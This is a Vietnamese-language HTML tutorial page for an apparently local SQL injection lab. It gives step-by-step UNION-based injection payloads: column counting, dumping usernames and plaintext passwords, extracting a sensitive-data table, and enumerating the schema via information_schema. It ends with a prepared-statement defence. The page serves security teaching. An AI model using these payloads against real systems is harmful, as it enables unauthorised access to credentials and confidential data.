<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Union Attack - Hướng Dẫn Chi Tiết</title>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <div class="container">
        <header class="header">
            <div class="logo">
                <i class="fas fa-graduation-cap"></i>
                <h1>Union Attack - Hướng Dẫn Từng Bước</h1>
            </div>
            <a href="index.html" class="btn-back"><i class="fas fa-arrow-left"></i> Quay lại</a>
        </header>

        <div class="card">
            <h2><i class="fas fa-info-circle"></i> Cách thêm payload vào URL</h2>
            <p>Union Attack thực hiện qua URL với tham số <code>id</code>:</p>
            <div class="code-example">
                <pre><code>http://localhost/sqli_demo/union_attack.php?id=[PAYLOAD]</code></pre>
            </div>
            
            <div class="highlight-box info">
                <i class="fas fa-lightbulb"></i>
                <div>
                    <strong>Lưu ý:</strong> Các ký tự đặc biệt cần encode:
                    <ul style="margin-top: 10px;">
                        <li>Dấu cách → <code>%20</code> hoặc <code>+</code></li>
                        <li>Dấu <code>--</code> → <code>--</code> (không cần encode)</li>
                        <li>Hoặc dùng <code>#</code> thay cho <code>--</code></li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="card">
            <h2><i class="fas fa-list-ol"></i> Các Bước Tấn Công</h2>
            
            <!-- Bước 1 -->
            <div class="attack-step">
                <h3>📋 Bước 1: Tìm số cột trong bảng</h3>
                <p>Dùng ORDER BY để xác định số cột:</p>
                
                <div class="url-example">
                    <strong>Thử 1 cột:</strong>
                    <div class="url-box">
                        <code>union_attack.php?id=1 ORDER BY 1 --</code>
                        <a href="union_attack.php?id=1 ORDER BY 1 --" target="_blank" class="btn-test">
                            <i class="fas fa-external-link-alt"></i> Thử ngay
                        </a>
                    </div>
                </div>

                <div class="url-example">
                    <strong>Thử 2 cột:</strong>
                    <div class="url-box">
                        <code>union_attack.php?id=1 ORDER BY 2 --</code>
                        <a href="union_attack.php?id=1 ORDER BY 2 --" target="_blank" class="btn-test">
                            <i class="fas fa-external-link-alt"></i> Thử ngay
                        </a>
                    </div>
                </div>

                <div class="url-example">
                    <strong>Thử 3 cột:</strong>
                    <div class="url-box">
                        <code>union_attack.php?id=1 ORDER BY 3 --</code>
                        <a href="union_attack.php?id=1 ORDER BY 3 --" target="_blank" class="btn-test">
                            <i class="fas fa-external-link-alt"></i> Thử ngay
                        </a>
                    </div>
                </div>

                <div class="url-example">
                    <strong>Thử 4 cột (sẽ lỗi):</strong>
                    <div class="url-box">
                        <code>union_attack.php?id=1 ORDER BY 4 --</code>
                        <a href="union_attack.php?id=1 ORDER BY 4 --" target="_blank" class="btn-test">
                            <i class="fas fa-external-link-alt"></i> Thử ngay
                        </a>
                    </div>
                </div>

                <div class="highlight-box success">
                    <i class="fas fa-check-circle"></i>
                    <strong>Kết luận:</strong> Bảng products có 3 cột!
                </div>
            </div>

            <!-- Bước 2 -->
            <div class="attack-step">
                <h3>🧪 Bước 2: Test UNION với NULL</h3>
                <p>Kiểm tra UNION có hoạt động không:</p>
                
                <div class="url-example">
                    <strong>UNION với 3 NULL:</strong>
                    <div class="url-box">
                        <code>union_attack.php?id=1 UNION SELECT NULL, NULL, NULL --</code>
                        <a href="union_attack.php?id=1 UNION SELECT NULL, NULL, NULL --" target="_blank" class="btn-test">
                            <i class="fas fa-external-link-alt"></i> Thử ngay
                        </a>
                    </div>
                </div>

                <div class="highlight-box success">
                    <i class="fas fa-check-circle"></i>
                    <strong>Kết quả:</strong> Hiển thị thêm 1 hàng với giá trị NULL → UNION hoạt động!
                </div>
            </div>

            <!-- Bước 3 -->
            <div class="attack-step">
                <h3>💣 Bước 3: Lấy dữ liệu từ bảng USERS</h3>
                <p>Thay NULL bằng tên cột từ bảng users:</p>
                
                <div class="url-example">
                    <strong>Lấy username, password, email:</strong>
                    <div class="url-box">
                        <code>union_attack.php?id=1 UNION SELECT username, password_plain, email FROM users --</code>
                        <a href="union_attack.php?id=1 UNION SELECT username, password_plain, email FROM users --" target="_blank" class="btn-test btn-danger">
                            <i class="fas fa-bomb"></i> TẤNG CÔNG!
                        </a>
                    </div>
                </div>

                <div class="highlight-box danger">
                    <i class="fas fa-exclamation-triangle"></i>
                    <strong>Nguy hiểm:</strong> Lộ TẤT CẢ username và password của users!
                </div>
            </div>

            <!-- Bước 4 -->
            <div class="attack-step">
                <h3>💣 Bước 4: Lấy dữ liệu NHẠY CẢM</h3>
                <p>Truy cập bảng sensitive_data:</p>
                
                <div class="url-example">
                    <strong>Lấy tài liệu mật:</strong>
                    <div class="url-box">
                        <code>union_attack.php?id=1 UNION SELECT document_name, content, classification FROM sensitive_data --</code>
                        <a href="union_attack.php?id=1 UNION SELECT document_name, content, classification FROM sensitive_data --" target="_blank" class="btn-test btn-danger">
                            <i class="fas fa-bomb"></i> TẤNG CÔNG!
                        </a>
                    </div>
                </div>

                <div class="highlight-box danger">
                    <i class="fas fa-skull-crossbones"></i>
                    <strong>Cực kỳ nguy hiểm:</strong> Lộ báo cáo tài chính, kế hoạch chiến lược, thông tin khách hàng VIP!
                </div>
            </div>

            <!-- Bước 5 -->
            <div class="attack-step">
                <h3>🗄️ Bước 5: Liệt kê tất cả BẢNG trong database</h3>
                <p>Sử dụng information_schema để xem cấu trúc database:</p>
                
                <div class="url-example">
                    <strong>Xem tất cả bảng:</strong>
                    <div class="url-box">
                        <code>union_attack.php?id=1 UNION SELECT table_name, table_schema, NULL FROM information_schema.tables WHERE table_schema='sqli_demo' --</code>
                        <a href="union_attack.php?id=1 UNION SELECT table_name, table_schema, NULL FROM information_schema.tables WHERE table_schema='sqli_demo' --" target="_blank" class="btn-test btn-danger">
                            <i class="fas fa-database"></i> Xem cấu trúc DB
                        </a>
                    </div>
                </div>

                <div class="highlight-box warning">
                    <i class="fas fa-info-circle"></i>
                    <strong>Hậu quả:</strong> Kẻ tấn công biết tên tất cả bảng → tấn công sâu hơn!
                </div>
            </div>

            <!-- Bước 6 -->
            <div class="attack-step">
                <h3>📊 Bước 6: Xem cấu trúc CỘT của bảng</h3>
                <p>Liệt kê tất cả cột trong bảng users:</p>
                
                <div class="url-example">
                    <strong>Xem cột của bảng users:</strong>
                    <div class="url-box">
                        <code>union_attack.php?id=1 UNION SELECT column_name, data_type, NULL FROM information_schema.columns WHERE table_name='users' --</code>
                        <a href="union_attack.php?id=1 UNION SELECT column_name, data_type, NULL FROM information_schema.columns WHERE table_name='users' --" target="_blank" class="btn-test btn-danger">
                            <i class="fas fa-columns"></i> Xem cột
                        </a>
                    </div>
                </div>
            </div>
        </div>

        <div class="card">
            <h2><i class="fas fa-copy"></i> Copy & Paste URLs</h2>
            <p>Các URL đầy đủ để copy vào trình duyệt:</p>
            
            <div class="copy-box">
                <h4>🎯 Lấy tất cả users:</h4>
                <textarea readonly onclick="this.select()">http://localhost/sqli_demo/union_attack.php?id=1 UNION SELECT username, password_plain, email FROM users --</textarea>
            </div>

            <div class="copy-box">
                <h4>🎯 Lấy dữ liệu nhạy cảm:</h4>
                <textarea readonly onclick="this.select()">http://localhost/sqli_demo/union_attack.php?id=1 UNION SELECT document_name, content, classification FROM sensitive_data --</textarea>
            </div>

            <div class="copy-box">
                <h4>🎯 Liệt kê bảng:</h4>
                <textarea readonly onclick="this.select()">http://localhost/sqli_demo/union_attack.php?id=1 UNION SELECT table_name, table_schema, NULL FROM information_schema.tables WHERE table_schema='sqli_demo' --</textarea>
            </div>

            <div class="copy-box">
                <h4>🎯 Xem cột của bảng users:</h4>
                <textarea readonly onclick="this.select()">http://localhost/sqli_demo/union_attack.php?id=1 UNION SELECT column_name, data_type, NULL FROM information_schema.columns WHERE table_name='users' --</textarea>
            </div>
        </div>

        <div class="card">
            <h2><i class="fas fa-terminal"></i> Encode URL (nếu cần)</h2>
            <p>Nếu trình duyệt không tự động encode, dùng các format sau:</p>
            
            <div class="code-example">
                <h4>Dùng dấu + thay cho space:</h4>
                <pre><code>union_attack.php?id=1+UNION+SELECT+username,password_plain,email+FROM+users+--</code></pre>
            </div>

            <div class="code-example">
                <h4>Dùng %20 thay cho space:</h4>
                <pre><code>union_attack.php?id=1%20UNION%20SELECT%20username,password_plain,email%20FROM%20users%20--</code></pre>
            </div>

            <div class="code-example">
                <h4>Dùng # thay cho --:</h4>
                <pre><code>union_attack.php?id=1 UNION SELECT username,password_plain,email FROM users #</code></pre>
            </div>
        </div>

        <div class="card">
            <h2><i class="fas fa-shield-alt"></i> Cách Phòng Chống</h2>
            
            <div class="comparison-box">
                <div class="comparison-item danger">
                    <h4>❌ Code dễ bị tấn công:</h4>
                    <div class="code-example">
                        <pre><code>$id = $_GET['id'];
$sql = "SELECT * FROM products WHERE id = $id";</code></pre>
                    </div>
                </div>
                
                <div class="comparison-item success">
                    <h4>✅ Code an toàn:</h4>
                    <div class="code-example">
                        <pre><code>$id = $_GET['id'];

// Validate input
if (!is_numeric($id)) {
    die("Invalid ID");
}

// Prepared Statement
$stmt = $conn->prepare("SELECT * FROM products WHERE id = ?");
$stmt->bind_param("i", $id);
$stmt->execute();</code></pre>
                    </div>
                </div>
            </div>
        </div>

        <footer class="footer">
            <p><i class="fas fa-exclamation-triangle"></i> <strong>Cảnh báo:</strong> Chỉ thử nghiệm trên môi trường riêng!</p>
            <p>Tấn công hệ thống thực là hành vi phạm pháp!</p>
        </footer>
    </div>

    <style>
        .attack-step {
            background: rgba(15, 23, 42, 0.5);
            padding: var(--spacing-lg);
            border-radius: var(--radius-lg);
            margin-bottom: var(--spacing-lg);
            border-left: 4px solid var(--primary);
        }

        .url-example {
            margin: var(--spacing-md) 0;
        }

        .url-box {
            display: flex;
            align-items: center;
            gap: var(--spacing-sm);
            background: var(--bg-light);
            padding: var(--spacing-md);
            border-radius: var(--radius);
            margin-top: var(--spacing-xs);
        }

        .url-box code {
            flex: 1;
            font-family: 'Fira Code', monospace;
            color: var(--warning);
            font-size: 0.9rem;
        }

        .btn-test {
            padding: var(--spacing-xs) var(--spacing-md);
            background: var(--primary);
            color: white;
            text-decoration: none;
            border-radius: var(--radius-sm);
            font-size: 0.85rem;
            white-space: nowrap;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .btn-test:hover {
            background: var(--primary-dark);
            transform: translateX(3px);
        }

        .btn-test.btn-danger {
            background: var(--danger);
        }

        .btn-test.btn-danger:hover {
            background: #dc2626;
        }

        .copy-box {
            margin: var(--spacing-md) 0;
        }

        .copy-box h4 {
            margin-bottom: var(--spacing-xs);
            color: var(--text);
        }

        .copy-box textarea {
            width: 100%;
            padding: var(--spacing-sm);
            background: var(--bg-light);
            border: 2px solid var(--border);
            border-radius: var(--radius);
            color: var(--warning);
            font-family: 'Fira Code', monospace;
            font-size: 0.9rem;
            resize: vertical;
            min-height: 60px;
            cursor: pointer;
        }

        .copy-box textarea:focus {
            outline: none;
            border-color: var(--primary);
        }
    </style>
</body>
</html>
